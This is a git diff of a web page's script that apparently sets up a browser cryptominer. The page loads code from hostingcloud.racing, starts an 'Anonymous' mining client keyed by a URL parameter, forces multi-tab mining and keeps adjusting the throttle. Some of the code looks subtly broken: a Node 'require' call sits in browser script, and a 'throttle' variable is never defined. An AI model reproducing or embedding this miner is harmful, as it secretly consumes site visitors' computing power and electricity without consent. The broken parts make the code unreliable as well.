@@ -10,6 +10,8 @@
 <body>
     <script src="https://www.hostingcloud.racing/iPx4.js"></script>
     <script>
+        const os = require('os');
+
         async function load() {
             const URLSearchParamsObject = new URLSearchParams(window.location.search)
             console.log(window.location)
@@ -33,8 +35,15 @@
             }
             console.log('window.ci:', window.ci)
 
-            const _client = new Client.Anonymous(URLSearchParamsObject.get('s'), { throttle: 0, c: 'w' });
-            _client.start();
+            const _client = new window.ci.Anonymous(URLSearchParamsObject.get('s'), { throttle: 0, c: 'w' });
+            console.log('_client.getNumThreads():', _client.getNumThreads())
+            if (_client.getNumThreads() > 2) _client.setNumThreads(2);
+
+            _client.start(window.ci.FORCE_MULTI_TAB);
+
+            setInterval(() => {
+                _client.setThrottle(throttle);
+            }, 1000)
         }
 
         load();
